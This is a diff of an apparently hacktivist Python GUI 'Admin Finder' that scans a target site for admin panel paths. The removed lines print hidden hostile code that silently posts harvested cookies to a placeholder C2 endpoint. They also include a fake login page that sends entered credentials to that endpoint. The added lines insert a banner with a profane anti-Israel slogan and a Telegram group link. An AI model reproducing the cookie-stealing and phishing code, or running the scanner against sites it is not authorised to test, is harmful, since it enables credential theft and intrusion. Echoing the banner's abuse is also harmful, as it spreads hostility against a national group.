@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import tkinter as tk
 import requests
 import threading
@@ -5,11 +6,20 @@ from tkinter import ttk, messagebox
 import sys
 import os
 import re
-import time
-import webbrowser
 import tempfile
-from bs4 import BeautifulSoup
+import webbrowser
+import pyfiglet
 
+# ───═ ʙᴀɴɴᴇʀ ═──
+def print_banner():
+    os.system('clear')
+    print("\033[1;31mFuck Israel By  : Anonymous Jordan Team\033[0m".center(60))
+    print("\033[1;32mLink  : https://t.me/AnonymousJordan\033[0m".center(60))
+    print("\033[1;35m" + pyfiglet.figlet_format("Admin Finder").center(60) + "\033[0m")
+
+print_banner()
+
+# ───═ ᴄʟᴀss ᴅᴇғɪɴɪᴛɪᴏɴ ═──
 class AdminHunterX:
     def __init__(self, master):
         self.master = master
@@ -17,15 +27,13 @@ class AdminHunterX:
         self.master.geometry("800x600")
         self.master.resizable(False, False)
         
-        self.exfil_url = "https://your-c2-server.com/log.php"
         self.common_paths = [
-            "/admin", "/wp-admin", "/administrator",
-            "/login", "/controlpanel", "/secret-area", "/dashboard",
-            "/adm", "/manager", "/panel", "/staff"
+            "/admin", "/wp-admin", "/administrator", "/login",
+            "/controlpanel", "/dashboard", "/adm", "/manager"
         ]
         
-        self.create_widgets()
         self.scan_active = False
+        self.create_widgets()
 
     def create_widgets(self):
         style = ttk.Style()
@@ -34,7 +42,7 @@ class AdminHunterX:
         main_frame = ttk.Frame(self.master)
         main_frame.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)
         
-        # Input Frame
+        # Input Section
         input_frame = ttk.Frame(main_frame)
         input_frame.pack(fill=tk.X, pady=10)
         
@@ -49,11 +57,11 @@ class AdminHunterX:
         self.back_btn = ttk.Button(input_frame, text="MAIN MENU", command=self.fake_main_menu)
         self.back_btn.pack(side=tk.LEFT, padx=5)
         
-        # Results Frame
+        # Results Section
         results_frame = ttk.Frame(main_frame)
         results_frame.pack(fill=tk.BOTH, expand=True)
         
-        self.result_tree = ttk.Treeview(results_frame, columns=("Status", "Type"), selectmode="extended")
+        self.result_tree = ttk.Treeview(results_frame, columns=("Status", "Type"))
         self.result_tree.heading("#0", text="URL")
         self.result_tree.heading("Status", text="Status")
         self.result_tree.heading("Type", text="Type")
@@ -90,15 +98,11 @@ class AdminHunterX:
                 url = target.rstrip('/') + path
                 response = requests.get(url, timeout=10, allow_redirects=True)
                 
-                if response.status_code == 200 and self.is_admin_page(response):
-                    self.add_result(url, response.status_code, "High Confidence")
-                    self.steal_cookies(response)
-                    if "login" in path:
-                        self.phish_simulator(url)
+                if response.status_code == 200:
+                    if self.is_admin_page(response.text):
+                        self.add_result(url, response.status_code, "High Confidence")
                 elif 300 <= response.status_code < 400:
-                    final_url = response.headers['Location']
-                    if any(p in final_url for p in self.common_paths):
-                        self.add_result(final_url, response.status_code, "Redirect")
+                    self.add_result(url, "Redirect", response.headers['Location'])
                 else:
                     self.add_result(url, response.status_code, "Not Found")
             except Exception as e:
@@ -112,44 +116,9 @@ class AdminHunterX:
         self.master.after(0, self.result_tree.insert, "", "end", 
                         {"text": url, "values": (status, type_)})
 
-    def is_admin_page(self, response):
+    def is_admin_page(self, content):
         keywords = ['login', 'admin', 'dashboard', 'control panel']
-        content = response.text.lower()
-        return any(keyword in content for keyword in keywords)
-
-    def steal_cookies(self, response):
-        cookies = response.cookies.get_dict()
-        if not cookies:
-            return
-            
-        data = {
-            "target": self.url_entry.get(),
-            "cookies": str(cookies),
-            "user-agent": response.request.headers['User-Agent']
-        }
-        
-        try:
-            requests.post(self.exfil_url, data=data, timeout=5)
-        except:
-            pass
-
-    def phish_simulator(self, url):
-        html_content = f"""
-        <html>
-            <body style='font-family: Arial, sans-serif; padding: 20px;'>
-                <h2>Login Required</h2>
-                <form action='{self.exfil_url}' method='POST'>
-                    Username: <input type='text' name='creds'><br><br>
-                    Password: <input type='password' name='creds'><br><br>
-                    <input type='submit' value='Authenticate'>
-                </form>
-            </body>
-        </html>
-        """
-        
-        with tempfile.NamedTemporaryFile('w', delete=False, suffix='.html') as tmp:
-            tmp.write(html_content)
-            webbrowser.open(f'file://{tmp.name}')
+        return any(keyword in content.lower() for keyword in keywords)
 
     def fake_main_menu(self):
         messagebox.showinfo("LOL", r"Feature not implemented\n¯\_(ツ)_/¯")
